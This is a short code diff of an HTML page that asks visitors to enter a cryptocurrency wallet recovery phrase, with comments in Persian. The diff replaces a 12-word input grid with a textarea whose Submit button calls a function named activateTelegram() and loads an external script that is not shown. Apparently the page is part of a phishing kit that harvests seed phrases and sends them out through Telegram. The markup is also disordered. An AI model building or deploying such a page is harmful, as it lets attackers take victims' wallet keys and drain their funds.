@@ -10,6 +10,11 @@
 </body>
 </html>
 
+
+
+
+
+
         /* Global Reset */
         * {
             margin: 0;
@@ -301,51 +306,18 @@
         </nav>
     </header>
    
+    <body>
     
-</style>
-</head>
-<body>
-<div class="recovery-box">
-    <h2>Enter Your Recovery Phrase</h2>
-    <div class="word-grid" id="word-grid">
-        <!-- Word inputs will be dynamically created here -->
-    </div>
-    <button onclick="submitRecoveryPhrase()">Submit</button>
-</div>
 
-<script>
-    document.addEventListener("DOMContentLoaded", () => {
-        const wordCount = 12; // تغییر به 24 برای تعداد کلمات بیشتر
-        const wordGrid = document.getElementById("word-grid");
-
-        // ایجاد ورودی‌ها به صورت پویا
-        for (let i = 0; i < wordCount; i++) {
-            const input = document.createElement("input");
-            input.type = "text";
-            input.className = "word-input";
-            input.placeholder = `Word ${i + 1}`;
-            input.maxLength = 15; // محدودیت تعداد حروف
-            input.dataset.index = i + 1; // ذخیره شماره کلمه
-            wordGrid.appendChild(input);
-        }
-    });
-
-    function submitRecoveryPhrase() {
-        const inputs = document.querySelectorAll(".word-input");
-        const recoveryPhrase = Array.from(inputs).map(input => input.value.trim());
-
-        // بررسی اینکه همه ورودی‌ها پر شده باشند
-        if (recoveryPhrase.some(word => word === "")) {
-            alert("Please fill in all the words.");
-            return;
-        }
-
-        // نمایش یا ارسال عبارت بازیابی
-        console.log("Recovery Phrase:", recoveryPhrase.join(" "));
-        alert("Recovery phrase submitted successfully!");
-    }
-</script>
-</body>
+        <div class="recovery-box">
+            <h2>Enter Your Recovery Phrase</h2>
+            <textarea id="recovery-phrase" placeholder="Enter recovery phrase"></textarea>
+            <button onclick="activateTelegram()">Submit</button>
+        </div>
+        
+        <!-- بارگذاری فایل جاوا اسکریپت -->
+        <script src="/js/script.js"></script>
+        </body>
 
         
    
